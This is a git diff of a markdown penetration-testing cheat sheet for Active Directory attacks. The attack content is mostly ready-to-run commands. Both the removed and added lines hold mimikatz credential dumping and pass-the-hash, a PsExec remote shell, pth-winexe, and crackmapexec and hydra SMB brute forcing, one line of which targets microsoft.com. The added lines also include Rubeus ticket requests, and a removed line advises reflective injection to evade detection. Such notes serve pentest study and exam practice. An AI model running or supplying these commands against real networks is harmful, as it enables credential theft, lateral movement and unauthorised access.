@@ -367,29 +367,31 @@ privilege::debug
 sekurlsa::logonpasswords
 
 # get the hash here
-
-#pass the hash
-
-sekurlsa::pth /user:zensvc /domain:exam.com /ntlm:d098fa8675acd7d26ab86eb2581233e5 /run:PowerShell.exe
-
-#get remote shell
-.\PsExec.exe \\dc02 cmd.exe
-
-
 ```
 
-Or as one liner in cmd
+### Password misues
 
-```cmd
-mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
-```
-
+* if clear text password is obtained start new powershell session
 
 ```powershell
-# never use mimikatz as a standalone tool as it shall get detected
-# instead inject it into memmory using this module from ps mafia
 
-https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1
+# Set the username and password
+$username = "Username"
+$password = ConvertTo-SecureString -String "Password" -AsPlainText -Force
+$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $username, $password
+
+# Create a new PowerShell session with the specified credentials
+$session = New-PSSession -ComputerName "RemoteComputerName" -Credential $credential
+
+# Enter the session and execute commands
+Enter-PSSession -Session $session
+
+# Example: Run a command within the session
+Get-Process
+
+# Exit the session
+Exit-PSSession
+
 
 ```
 
@@ -407,16 +409,46 @@ klist
 
 ```
 
-* after this the service can be accessed 
+* after this the service can be accessed
 
 ### Pass the Hash
 
-If hash is obtained from the memmory of compromised host, use it with pth-winexe kali tool
+* if hash is obtained from the memmory
 
 ```bash
 
+# remote from kali machine
+
 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
 ```
+
+```powershell
+# locally on windows host
+
+sekurlsa::pth /user:zensvc /domain:exam.com /ntlm:d098fa8675acd7d26ab86eb2581233e5 /run:PowerShell.exe
+
+```
+
+* bruteforce with crackmapexec
+
+```bash
+
+crackmapexec smb ip -u users.txt -H 2126EE7712D37E265FD63F2C84D2B13D --local-auth
+
+```
+
+* bruteforce with hydra
+
+```powershell
+
+## PSH SMB
+hydra smb://ip  -l username -p D5731CFC6C2A069C21FD0D49CAEBC9EA:2126EE7712D37E265FD63F2C84D2B13D::: -m "local hash"
+
+## BRUTEFORCING SMB ON OTHER DOMAIN IN AD WITH PASSWORDLIST
+hydra smb://microsoft.com  -l username -P passwords.txt -m "other_domain:SECONDDOMAIN"
+
+```
+
 
 ### Overpass the Hash
 
@@ -425,7 +457,8 @@ This attack uses NTLM hash to obtain a TGT to gain further access
 ```bash
 #use mimikatz to obtain powershell session as admin if NTLM hash is available
 
-sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
+Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] 
+
 
 ```
 
